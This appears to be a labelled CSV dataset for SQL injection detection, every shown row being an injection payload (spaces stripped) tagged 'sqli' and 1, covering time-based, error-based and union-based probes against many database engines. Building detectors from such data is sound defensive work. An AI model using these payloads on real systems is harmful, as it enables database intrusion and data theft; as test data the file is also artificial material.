payload,attack_type,label
"1'))asxjenwhere6791=6791orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1
"1';callregexp_substring(repeat(right(char(3702),0),500000000),null)and'rfgj'like'rfgj",sqli,1
"1')and9254=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1')));selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
1'+(select'sbji'where7989=7989rlike(select*from(select(sleep(5)))sgvo))+',sqli,1
1';selectpg_sleep(5)--,sqli,1
"1%"")and8189=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1'inbooleanmode);selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5#",sqli,1
"1"")where2445=2445;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"1%"";selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
1%'));select(casewhen(3444=8424)then3444else3444*(select3444frominformation_schema.character_sets)end)#,sqli,1
1%')))orderby1#,sqli,1
"1))asxzclwhere2332=2332;selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
-9742)where8409=8409or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)--,sqli,1
"1"")where8462=8462andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1
"-6405'unionallselect8235,8235,8235,8235,8235#",sqli,1
"-7584'unionallselect1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",sqli,1
1)asobznwhere7652=7652or(select*from(select(sleep(5)))ydpu)--,sqli,1
"1'||(select'pvmz'fromdualwhere1090=1090procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1))||'",sqli,1
"1'andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71))and'lgat'like'lgat",sqli,1
"1)where4768=4768unionallselectnull,null,null,null,null,null,null,null#",sqli,1
-2100'where9260=9260or3038=3038,sqli,1
"1))asfynxwhere9636=9636unionallselectnull,null,null,null,null--",sqli,1
"1')and8189=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1'andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)and'egye'='egye",sqli,1
1'and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),sqli,1
"1'orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",sqli,1
"1%')));select*fromgenerate_series(5206,5206,casewhen(5206=2214)then1else0end)limit1--",sqli,1
"1%'and8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
"1"")asgffqwhere4387=4387orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))--",sqli,1
1'||(select'allj'where7334=7334;begindbms_lock.sleep(5);end)||',sqli,1
1'||(select'sxya'where3578=3578;select(casewhen(6276=6276)then6276else6276*(select6276frominformation_schema.character_sets)end)#,sqli,1
-3185'))or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)and(('rknd'like'rknd,sqli,1
-4523or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1
"-1908"")where6420=6420unionallselect6420,6420,6420,6420--",sqli,1
"1"")assaqywhere9704=9704(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))--",sqli,1
"1%'and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and'%'='",sqli,1
-2055)or3038=3038,sqli,1
"-5379')unionallselect4294,4294,4294--",sqli,1
"1""where8234=8234;select(casewhen(4291=6937)then4291else4291*(select4291frommysql.db)end)#",sqli,1
"1')))or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and((('ewwi'='ewwi",sqli,1
"1'andexp(~(select*from(selectconcat(0x7171706a71,(select(elt(8190=8190,1))),0x717a767a71,0x78))x))and'kwhs'like'kwhs",sqli,1
"1'+(select'ncny'where5634=5634;selectlike('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1
"-6368'unionallselect6529,6529,6529--",sqli,1
1'where2134=2134rlike(select(casewhen(3613=2090)then1else0x28end))--,sqli,1
"1'where8837=8837and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
1))asskexwhere7941=7941andsleep(5)--,sqli,1
"1')or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)and('ekqv'='ekqv",sqli,1
"1')and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)",sqli,1
"1%')));selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5--",sqli,1
1'+(selectaqhjwhere4419=4419;waitfordelay'0:0:5'--,sqli,1
1')and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and('yaim'='yaim,sqli,1
"-7635""unionallselect1284,1284,1284,1284,1284,1284#",sqli,1
"1""or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and""ctdc""=""ctdc",sqli,1
"-9439"")where9460=9460or(9497=9586)*9586--",sqli,1
"1)where5550=5550(select(casewhen(5451=5451)thenregexp_substring(repeat(right(char(5451),0),500000000),null)elsechar(108)||char(76)||char(112)||char(116)end)frominformation_schema.system_users)--",sqli,1
"-9829')))or1groupbyconcat(0x7171706a71,(select(casewhen(4232=4232)then1else0end)),0x717a767a71,floor(rand(0)*2))havingmin(0)#",sqli,1
"1%"")))unionallselectnull,null,null,null,null,null,null,null--",sqli,1
1where2672=2672and1819=4322#,sqli,1
"1')where8125=8125and4241=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(4241=4241)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1
"1'||(select'dajl'fromdualwhere8440=8440;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
1'+(select'sfko'where6853=6853rlikesleep(5)#,sqli,1
"1"");select(casewhen(4415=2051)then4415elsecast(1asint)/(select0fromdual)end)fromdual--",sqli,1
"1"")asubvawhere6369=6369and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1')orelt(5873=5873,sleep(5))#",sqli,1
"1"")asqjyuwhere2679=2679and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1%'and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and'%'='",sqli,1
"1%"";callregexp_substring(repeat(right(char(3702),0),500000000),null)and""%""=""",sqli,1
"1'+(select'utlx'where6256=6256orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71)))+'",sqli,1
1'orsleep(5)#,sqli,1
1));select(casewhen(6002=9048)then6002else6002*(select6002frommysql.db)end)#,sqli,1
"-2745')orelt(1032=1032,3623)and('vfxq'='vfxq",sqli,1
1'and(select*from(select(sleep(5)))fzno)and'vwve'like'vwve,sqli,1
"-2033"")or1groupbyconcat(0x7171706a71,(select(casewhen(4232=4232)then1else0end)),0x717a767a71,floor(rand(0)*2))havingmin(0)#",sqli,1
"1or(select9173from(selectcount(*),concat(0x7171706a71,(select(elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)#cqqs",sqli,1
"-9382')unionallselect4774,4774,4774,4774--",sqli,1
"1"")asxrsiwhere9498=9498;selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5--",sqli,1
1'||(select'rhcv'where6228=6228;select(casewhen(3672=8360)then3672else3672*(select3672frominformation_schema.character_sets)end)#,sqli,1
-4248where3288=3288or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)--,sqli,1
"1"";selectdbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5)fromdualand""ulfr""like""ulfr",sqli,1
1%'))unionallselectnull#,sqli,1
"1""or4411=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and""snht""=""snht",sqli,1
"1"")));selectbenchmark(5000000,md5(0x4c4d6142))and(((""bqfj""like""bqfj",sqli,1
"1')and3707=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and('plfa'='plfa",sqli,1
"1')));selectdbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5)fromdualand((('xmwj'='xmwj",sqli,1
"1'+(select'tzyz'where4912=4912or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
1')and4595=4595#,sqli,1
"1%""and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq')and""%""=""",sqli,1
"-4085'+(selectaipnwhere5493=5493unionallselect5493,5493,5493,5493,5493,5493,5493#",sqli,1
"-3151%"")))unionallselect6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",sqli,1
"1""))asdcrkwhere5164=5164and2716=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"-1030""where2161=2161unionallselect2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",sqli,1
"1%')))and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"-9133""))or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and((""crfy""=""crfy",sqli,1
"1'||(select'blvu'fromdualwhere9813=9813;selectcount(*)fromgenerate_series(1,5000000))||'",sqli,1
"1'unionallselectnull,null--",sqli,1
"1"";iif(2084=5671,1,1/0)",sqli,1
"1'||(select'jmao'where3009=3009;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"-6770""or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)",sqli,1
1';begindbms_lock.sleep(5);endand'aenf'='aenf,sqli,1
-6377'or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and'qcms'like'qcms,sqli,1
"-2803')asjciywhere1130=1130ormake_set(4599=6550,6550)--",sqli,1
"-8629where8049=8049unionallselect8049,8049,8049,8049,8049,8049,8049#",sqli,1
"1%')or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)and('%'='",sqli,1
"1"");callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(""pdqm""like""pdqm",sqli,1
"-8491""where6107=6107or4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4493=4493)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1
"1"");selectcount(*)fromgenerate_series(1,5000000)and(""kngx""like""kngx",sqli,1
"elt(8192=8192,sleep(5))",sqli,1
"1"")asupjwwhere3880=3880and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1)ashywxwhere1424=1424and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
1%';selectcasewhen7717=7717then1elsenullend--,sqli,1
1));selectsleep(5)#,sqli,1
-9509')))or1091=5477and((('gsmz'='gsmz,sqli,1
1)where9683=9683;select(casewhen(1082=6755)then1082else1082*(select1082frommysql.db)end)#,sqli,1
"-5643'))unionallselect1515,1515#",sqli,1
"-2951""or4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4493=4493)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))",sqli,1
"1""where9618=9618and(3020=3020)*6703--",sqli,1
1'||(select'yydv'fromdualwhere9639=9639;selectcasewhen8514=3207then1elsenullend--,sqli,1
"make_set(8734=8734,sleep(5))",sqli,1
1'||(select'awba'fromdualwhere3749=3749and1445=3334--,sqli,1
-8370'))or(3501=6407)*6407and(('agcm'like'agcm,sqli,1
"-8566"")ashnchwhere3418=3418unionallselect3418,3418,3418,3418,3418,3418,3418#",sqli,1
"-7715')unionallselect4830,4830,4830,4830,4830,4830,4830,4830--",sqli,1
"1)and4241=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(4241=4241)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1
"1)))orupdatexml(1808,concat(0x2e,0x7171706a71,(select(elt(1808=1808,1))),0x717a767a71),8666)and(((9474=9474",sqli,1
1'andsleep(5),sqli,1
"1"")))unionallselectnull,null,null,null,null,null,null#",sqli,1
1%');waitfordelay'0:0:5'and('%'=',sqli,1
"1')));selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5and((('qvoy'='qvoy",sqli,1
"-8042)aszhoqwhere2120=2120unionallselect2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",sqli,1
1)and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq')and(3945=3945,sqli,1
"1""where4445=4445procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1
"1'))and8407=(selectcount(*)fromgenerate_series(1,5000000))and(('dfsj'='dfsj",sqli,1
"1%')))unionallselectnull,null,null#",sqli,1
-4582))asgvfowhere8885=8885or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)--,sqli,1
"1"")));selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
-3880)or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and(5194=5194,sqli,1
"1"")where1673=1673or7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
"1""where8697=8697andelt(3114=3114,sleep(5))#",sqli,1
"1'))unionallselectnull,null,null,null,null,null,null,null,null,null--",sqli,1
1and(select*from(select(sleep(5)))fzno),sqli,1
"1"");select(casewhen(6839=2730)then6839else6839*(select6839frommysql.db)end)#",sqli,1
1'||(select'xqqp'where3007=3007and(select*from(select(sleep(5)))gcrr)#,sqli,1
"1""where8483=8483orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1""where3247=3247or1022=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"-1451%')unionallselect7666,7666,7666#",sqli,1
"1"")and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and(""ccuy""=""ccuy",sqli,1
-4562')or3038=3038,sqli,1
"1'or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)",sqli,1
"1'))and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and(('bgdp'='bgdp",sqli,1
1)rlikesleep(5)and(5724=5724,sqli,1
-3062'))or6872=6872and(('uzth'like'uzth,sqli,1
"1and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))#couj",sqli,1
"1"")and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and(""qblj""like""qblj",sqli,1
"1""));(select*from(select(sleep(5)))srmq)and((""xeki""like""xeki",sqli,1
"1%""or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and""%""=""",sqli,1
"1')asomtbwhere1183=1183and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
1)))and(select*from(select(sleep(5)))gcrr)#,sqli,1
-3998'))or3038=3038,sqli,1
"1')orrow(1045,7562)>(selectcount(*),concat(0x7171706a71,(select(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))xfrom(select8488unionselect5584unionselect3051unionselect1210)agroupbyx)",sqli,1
"1'or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)",sqli,1
"-1830""))asbptvwhere4805=4805or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)--",sqli,1
"1))asspdfwhere8554=8554or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1
"1))asacniwhere6355=6355and9660=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1))asshmgwhere1371=1371unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
"1')asuvxlwhere6211=6211procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)--",sqli,1
"1'))andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(('lshk'like'lshk",sqli,1
"1"";begindbms_lock.sleep(5);end--",sqli,1
"1))askyclwhere8008=8008or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1""))and9254=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1%""and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and""%""=""",sqli,1
"1"")))or(select9173from(selectcount(*),concat(0x7171706a71,(select(elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)and(((""oyxk""=""oyxk",sqli,1
"1%'))or2367=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1')asxaguwhere9088=9088(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))--",sqli,1
1'));selectsleep(5)and(('ilcv'='ilcv,sqli,1
"-4615')))orelt(1032=1032,3623)and((('jipk'like'jipk",sqli,1
"1"")asdlfqwhere8410=8410;callregexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1
"1'+(select'ovti'where4243=4243and6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))+'",sqli,1
-8131'))or9680=3467,sqli,1
"1'))and9660=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1'where9116=9116andchar(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1""))andmake_set(8403=8403,8899)and((""ieuj""like""ieuj",sqli,1
"-9408%""))unionallselect1841,1841,1841,1841,1841,1841--",sqli,1
"1')where7252=7252;select*fromgenerate_series(4592,4592,casewhen(4592=4592)then1else0end)limit1--",sqli,1
"-7078'||(select'lcza'where5076=5076unionallselect5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",sqli,1
"-1134""unionallselect4865,4865,4865,4865,4865#",sqli,1
"1"");selectcount(*)fromgenerate_series(1,5000000)and(""jzmg""=""jzmg",sqli,1
"1;selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3",sqli,1
"1%"")and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
-8684'where9820=9820or6844=5105,sqli,1
1and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)--xwoo,sqli,1
"-4373'+(select'rlht'where2285=2285unionallselect2285,2285,2285#",sqli,1
"1'+(select'sacd'where5984=5984unionallselectnull,null,null,null,null,null,null#",sqli,1
"1""))aswooqwhere7671=7671androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)--",sqli,1
"1')))or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))and((('ckfn'like'ckfn",sqli,1
"1'))asnlfqwhere3410=3410orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))--",sqli,1
